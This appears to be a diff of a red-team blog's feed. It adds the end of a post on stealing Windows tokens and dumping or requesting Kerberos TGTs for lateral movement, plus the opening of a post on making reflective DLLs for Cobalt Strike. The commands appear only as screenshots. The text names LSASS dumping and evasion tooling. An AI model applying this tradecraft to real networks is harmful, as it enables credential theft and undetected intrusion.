+<p>To perform the bellow Keberos interactions, I use <a href="https://github.com/RalfHacker/Kerbeus-BOF">Kerbeus-BOF</a> but <a href="https://github.com/wavvs/nanorobeus/">nanorobeus</a> can also be used (Kerbeus-BOF is actually based on nanorobeus).</p>
+
+<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240104113937.png" alt="TGT enum" /></p>
+
+<p>Here we dump all the TGT which belong to <code class="language-plaintext highlighter-rouge">sadmin</code> user.</p>
+
+<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240104115246.png" alt="TGT dump" /></p>
+
+<p>In case we don’t have any TGT valid anymore, we can look for processes which run under our targeted user.</p>
+
+<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240104133300.png" alt="beacon processes" /></p>
+
+<p>Then steal the token of one of the processes.</p>
+
+<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240104115541.png" alt="steal token" /></p>
+
+<p>And use it to ask for a TGT</p>
+
+<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240104115747.png" alt="TGT ask" />
+<br />
+<img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240104115909.png" alt="TGT enum" /></p>
+
+<p>From here, we can act on behalf of <code class="language-plaintext highlighter-rouge">sadmin</code> user and try to move laterally in the network.
+<br /></p>
+<h2 id="conclusion">Conclusion</h2>
+
+<p>In this second part we saw how we can increase our stealth by using amazing open source tools such as BokuLoader.</p>
+
+<p>To avoid executing .NET assembly in memory, we used C++ tool CoercedPotato and modify it to be a Reflective DLL in order to be able to load it in memory with Cobalt Strike.</p>
+
+<p>For credentials dumping, we can use nanodump of Fortra to dump LSASS process to avoid detection. If we want to avoid touching LSASS, we show how Kerberos tickets can be extracted or generated by stealing Windows tokens.</p>]]></content><author><name>soka</name></author><category term="redteam" /><summary type="html"><![CDATA[Recap]]></summary></entry><entry><title type="html">Create Reflective DLL for Cobalt Strike</title><link href="https://sokarepo.github.io//redteam/2023/10/11/create-reflective-dll-for-cobaltstrike.html" rel="alternate" type="text/html" title="Create Reflective DLL for Cobalt Strike" /><published>2023-10-11T00:00:00+02:00</published><updated>2023-10-11T00:00:00+02:00</updated><id>https://sokarepo.github.io//redteam/2023/10/11/create-reflective-dll-for-cobaltstrike</id><content type="html" xml:base="https://sokarepo.github.io//redteam/2023/10/11/create-reflective-dll-for-cobaltstrike.html"><![CDATA[<h2 id="context">Context</h2>
 
 <p>This blog post aims to solve a problem I faced when using opensource tooling with Cobalt Strike.</p>
 
@@ -187,7 +604,7 @@ Two months ago, <a href="https://github.com/Prepouce/CoercedPotato">CoercedPotat
   <li>the coercer client</li>
 </ul>
 
-<p>I did not succeed to spawn the RPC server with <code class="language-plaintext highlighter-rouge">CreateThread</code> via a RDLL so I decided to first load the RDLL to spawn it then to load it another time to coerce the SYSTEM authentication.</p>
+<p>I did not succeed to spawn the RPC server with <code class="language-plaintext highlighter-rouge">CreateThread</code> via a RDLL so I decided to first load the RDLL to spawn it, then to load it another time to coerce the SYSTEM authentication.</p>
 
 <p>I removed some parts of the code to only keep the MS-RPRN coerce.</p>
 
